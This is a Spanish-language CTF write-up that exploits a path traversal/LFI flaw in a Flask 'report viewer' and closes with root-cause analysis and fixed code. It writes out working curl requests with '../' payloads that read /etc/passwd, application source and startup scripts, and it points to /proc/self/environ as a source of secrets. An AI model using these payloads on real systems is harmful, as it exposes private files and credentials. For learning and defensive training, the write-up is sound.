# Apuntes 5

| Campo | Detalle |
|---|---|
| **Categoría** | Web |
| **Puntos** | 300 |
| **Autor** | Lychi3 |
| **Objetivo** | `http://3.236.190.110` |
| **Descripción** | *"No deberia de leer eso, este sistema es seguro"* |
| **Vulnerabilidad** | LFI (Local File Inclusion) / Path Traversal en el visor de reportes |
| **CWE** | CWE-22 (Improper Limitation of a Pathname to a Restricted Directory – Path Traversal) |
| **OWASP** | A01:2021 – Broken Access Control |

## 1. Reconocimiento

El panel admin incluye **"Reportes del sistema"**:

```text
$ curl -s -b "session=$COOKIE" http://3.236.190.110/admin/reports
```

```html
<h2>Reportes del sistema</h2>
<a href="/admin/report?file=informe_q3.txt">Informe Q3 2026</a>
<a href="/admin/report?file=metricas.txt">Metricas del servidor</a>
<a href="/admin/report?file=usuarios.txt">Usuarios activos</a>
```

Los reportes se cargan con un **nombre de archivo en el parámetro `file`**. Es el patrón típico de LFI.

## 2. Análisis

Si el servidor concatena `file` a un directorio base sin validarlo, `../` permite salir de ese directorio y leer cualquier archivo del sistema.

## 3. Explotación

### 3.1 Prueba de concepto con `/etc/passwd`

```text
$ curl -s -b "session=$COOKIE" \
  "http://3.236.190.110/admin/report?file=../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

El LFI queda confirmado.

### 3.2 Lectura de la bandera

El `ls -la /` de [Apuntes 4](../apuntes-4/README.md) mostró `/flag_lfi.txt` (29 bytes):

```text
$ curl -s -b "session=$COOKIE" \
  "http://3.236.190.110/admin/report?file=../../../../flag_lfi.txt"
AHAU{lfi_4r3_d4ng3r0us_guys}
```

Estas variantes también funcionaron:

```bash
# más o menos niveles: al llegar a "/" los "../" extra se ignoran
?file=../../../flag_lfi.txt
?file=../../../../../flag_lfi.txt
# ruta absoluta (ver causa raíz)
?file=/flag_lfi.txt
```

### 3.3 Post-explotación: lectura del código fuente

Con el LFI se leyó el código completo de la aplicación. Ese código explica todos los retos de la serie Apuntes:

```text
$ curl -s -b "session=$COOKIE" \
  "http://3.236.190.110/admin/report?file=../../../../app/app.py"
from flask import Flask, request, render_template, redirect, make_response
import json, base64, os, re, subprocess

FLAG1 = os.environ.get("FLAG_WEB1", "CTF{base64_is_not_encryption}")
FLAG2 = os.environ.get("FLAG_WEB2", "CTF{cookie_tampering_admin_true}")
FLAG3 = os.environ.get("FLAG_WEB3", "CTF{idor_access_control_matters}")
FLAG4 = os.environ.get("FLAG_WEB4", "CTF{command_injection_ping_pong}")
FLAG5 = os.environ.get("FLAG_WEB5", "CTF{lfi_path_traversal_read}")
...
```

También se leyó el script de arranque del contenedor:

```text
$ curl -s -b "session=$COOKIE" \
  "http://3.236.190.110/admin/report?file=../../../../entrypoint.sh" | grep FLAG
FLAG_WEB4" > /var/backups/old/2024/config/master.txt
FLAG_WEB5" > /flag_lfi.txt
```

Así se localizó la bandera de Apuntes 4.

## 4. Causa raíz

```python
@app.route("/admin/report")
def view_report():
    ...
    filename = request.args.get("file", "")
    try:
        path = os.path.join("/app/reports", filename)   # sin validar
        with open(path) as f:
            content = f.read()
        return render_template("report_view.html", filename=filename, content=content)
    except Exception:
        return "Archivo no encontrado", 404
```

Hay dos problemas:

**1. Path traversal.** `os.path.join` no normaliza la ruta:

```python
>>> os.path.join("/app/reports", "../../../../flag_lfi.txt")
'/app/reports/../../../../flag_lfi.txt'   # el SO lo resuelve a /flag_lfi.txt
```

**2. Rutas absolutas.** Si el segundo argumento de `os.path.join` es absoluto, **descarta** el directorio base:

```python
>>> os.path.join("/app/reports", "/flag_lfi.txt")
'/flag_lfi.txt'
```

No hay lista blanca de archivos ni comprobación de que la ruta final quede dentro de `/app/reports`.

## 5. Impacto

- Lectura de cualquier archivo que pueda leer el proceso: código fuente, `/etc/passwd`, configuraciones, llaves y scripts de arranque.
- Con `/proc/self/environ` se obtienen las variables de entorno con **todos los secretos**.
- Combinado con el resto de la cadena, la aplicación queda comprometida por completo.

## 6. Remediación

Usar una lista blanca, y si no es posible, resolver la ruta real y verificar que quede dentro del directorio permitido:

```python
import os
from flask import abort, send_from_directory

REPORTS_DIR = os.path.realpath("/app/reports")
ALLOWED = {"informe_q3.txt", "metricas.txt", "usuarios.txt"}

@app.route("/admin/report")
@admin_required
def view_report():
    filename = request.args.get("file", "")

    # Opción 1: lista blanca (la más segura)
    if filename not in ALLOWED:
        abort(404)

    # Opción 2: validar que la ruta real quede dentro de REPORTS_DIR
    path = os.path.realpath(os.path.join(REPORTS_DIR, filename))
    if os.path.commonpath([REPORTS_DIR, path]) != REPORTS_DIR:
        abort(404)

    return send_from_directory(REPORTS_DIR, filename)   # usa safe_join internamente
```

## 🚩 Flag

```text
AHAU{lfi_4r3_d4ng3r0us_guys}
```

## Cadena completa de la serie Apuntes

```text
[Apuntes 1] Cookie Base64 legible ──► flag 1 + estructura de la sesión
      │
      ▼
[Apuntes 2] Cookie sin firma ──► admin:true ──► panel admin + flag 2
      │
      ├──► [Apuntes 3] /admin/note/<id> sin validar dueño ──► IDOR ──► flag 3
      │
      ├──► [Apuntes 4] /admin/tools ──► command injection ──► ls / ──► flag 4
      │                                                         │
      └──► [Apuntes 5] /admin/report?file= ──► LFI ──► app.py + entrypoint.sh ──► flag 5
```

---
[⬅ Apuntes 4](../apuntes-4/README.md) · [Índice](../../README.md)
